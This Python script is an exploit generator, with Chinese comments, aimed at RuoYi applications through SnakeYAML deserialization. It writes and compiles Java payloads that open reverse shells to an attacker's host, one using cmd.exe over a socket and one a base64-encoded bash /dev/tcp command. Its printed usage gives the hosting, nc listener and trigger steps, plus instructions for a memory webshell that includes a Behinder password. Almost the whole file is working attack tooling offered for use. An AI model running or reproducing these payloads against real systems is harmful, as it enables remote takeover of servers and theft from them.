import os
import shutil
import sys
import argparse
import base64

# Windows原生Payload模板
WINDOWS_TEMPLATE = '''package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {{

    public AwesomeScriptEngineFactory() throws java.io.IOException, InterruptedException {{
        try {{
            
        String host="{ip}";
        int port={port};
        String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        java.net.Socket s=new java.net.Socket(host,port);
        java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {{
            while(pi.available()>0) {{
                so.write(pi.read());
            }}
            while(pe.available()>0) {{
                so.write(pe.read());
            }}
            while(si.available()>0) {{
                po.write(si.read());
            }}
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {{
                p.exitValue();
                break;
            }}
            catch (Exception e){{
            }}
        }};
        p.destroy();
        s.close();
        }} catch (IOException e) {{
            e.printStackTrace();
        }}
    }}

    @Override public String getEngineName() {{ return null; }}
    @Override public String getEngineVersion() {{ return null; }}
    @Override public List<String> getExtensions() {{ return null; }}
    @Override public List<String> getMimeTypes() {{ return null; }}
    @Override public List<String> getNames() {{ return null; }}
    @Override public String getLanguageName() {{ return null; }}
    @Override public String getLanguageVersion() {{ return null; }}
    @Override public Object getParameter(String key) {{ return null; }}
    @Override public String getMethodCallSyntax(String obj, String m, String... args) {{ return null; }}
    @Override public String getOutputStatement(String toDisplay) {{ return null; }}
    @Override public String getProgram(String... statements) {{ return null; }}
    @Override public ScriptEngine getScriptEngine() {{ return null; }}
}}'''

# Linux原生Payload模板
def linux_payload(ip, port):
    return f'''package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {{

    public AwesomeScriptEngineFactory() {{
        try {{
            Runtime.getRuntime().exec("{base64linux_rebound_shell(ip, port)}");
        }} catch (IOException e) {{
            e.printStackTrace();
        }}
    }}

    @Override public String getEngineName() {{ return null; }}
    @Override public String getEngineVersion() {{ return null; }}
    @Override public List<String> getExtensions() {{ return null; }}
    @Override public List<String> getMimeTypes() {{ return null; }}
    @Override public List<String> getNames() {{ return null; }}
    @Override public String getLanguageName() {{ return null; }}
    @Override public String getLanguageVersion() {{ return null; }}
    @Override public Object getParameter(String key) {{ return null; }}
    @Override public String getMethodCallSyntax(String obj, String m, String... args) {{ return null; }}
    @Override public String getOutputStatement(String toDisplay) {{ return null; }}
    @Override public String getProgram(String... statements) {{ return null; }}
    @Override public ScriptEngine getScriptEngine() {{ return null; }}
}}'''

def base64linux_rebound_shell(ip, port):
    shell = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
    base64shell = base64.b64encode(shell.encode('utf-8')).decode('utf-8')
    return f'bash -c {{echo,{base64shell}}}|{{base64,-d}}|{{bash,-i}}'

def handle_generate_command(args):
    """处理旧版直接调用和新版generate子命令"""
    # 创建源码目录
    src_dir = os.path.join('src', 'artsploit')
    os.makedirs(src_dir, exist_ok=True)

    # 生成对应Payload
    java_file = os.path.join(src_dir, 'AwesomeScriptEngineFactory.java')
    if args.os.lower() == 'win':
        with open(java_file, 'w') as f:
            f.write(WINDOWS_TEMPLATE.format(ip=args.ip, port=args.port))
    else:
        with open(java_file, 'w') as f:
            f.write(linux_payload(args.ip, args.port))

    # 编译打包
    os.system(f'javac {java_file}')
    jar_name = 'ruoyi.jar' if args.os.lower() == 'win' else 'ruoyi.jar'
    os.system(f'jar -cvf {jar_name} -C src/ .')

    # 输出结果
    print(f'''
[+] JAR生成成功: {jar_name}
[+] 使用方法：
1. 托管JAR文件：
   python3 -m http.server 8000
   python2 -m SimpleHTTPServer 8000
2. 启动监听器：
   Linux: nc -lvnp {args.port}
   Windows: ncat -lvp {args.port}
3. 触发漏洞字符串：
   org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://{args.ip}:8000/{jar_name}"]]]]')
4.cron表达式:
   0/10 * * * * ?
5.Authon:G0mini
6.github:https://github.com/G0mini/PyBy2
7.记得关注公众号<极梦C>
    ''')

def main():
    parser = argparse.ArgumentParser(description='跨平台Payload生成工具', add_help=False)

    # 自动检测命令格式
    if len(sys.argv) == 4 and sys.argv[3] in ['win','linux']:
        # 兼容旧格式: python main.py ip port os
        args = argparse.Namespace(
            ip=sys.argv[1],
            port=int(sys.argv[2]),
            os=sys.argv[3],
            command='legacy'  # 标记为旧版调用
        )
        handle_generate_command(args)
        return

    # 新版子命令模式
    parser = argparse.ArgumentParser(description='跨平台Payload生成工具')
    subparsers = parser.add_subparsers(dest='command', required=True)

    # generate子命令（兼容旧参数位置）
    gen_parser = subparsers.add_parser('generate', help='生成反连Payload')
    gen_parser.add_argument('ip', help='监听IP地址')
    gen_parser.add_argument('port', type=int, help='监听端口')
    gen_parser.add_argument('os', choices=['win', 'linux'], help='目标系统类型')

    # payload子命令
    subparsers.add_parser('payload', help='构建Maven项目包')

    args = parser.parse_args()

    if args.command == 'generate':
        handle_generate_command(args)
    elif args.command == 'payload':
        try:
            # 进入payload目录
            os.chdir('payload')

            # 清理并打包
            if os.system('mvn clean package') == 0:
                # 移动生成的JAR文件
                src = 'target/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar'
                dest = '../yaml-payload.jar'
                shutil.move(src, dest)
                print(f"[+] Maven构建成功，文件已移动至: {dest}")
                print(f'''
                [+] 使用方法：
                1. 触发漏洞字符串：
                   org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://ip:8000/yaml-payload.jar"]]]]')
                2.cron表达式:
                   0/10 * * * * ?
                3.RuoYi用法:
                    ?cmd=whoami (直接执行命令)
                    /login?cmd=1(连接冰蝎,cmd不为空即可），密码为rebeyond，使用冰蝎正常连接即可
                    ?cmd=delete(卸载内存马)      
                  RuoYi Vue:
                    直接执行命令：/dev-api/?cmd=whoami
                    连接冰蝎：暂不支持
                    卸载内存马：/dev-api/?cmd=delete             
                3.Authon:G0mini
                4.github:https://github.com/G0mini/PyBy2
                5.记得关注公众号<极梦C>
                    ''')

            else:
                print("[-] Maven构建失败")
        finally:
            os.chdir('..')  # 返回上级目录
        # Maven构建逻辑（同上文）
        pass

if __name__ == '__main__':
    main()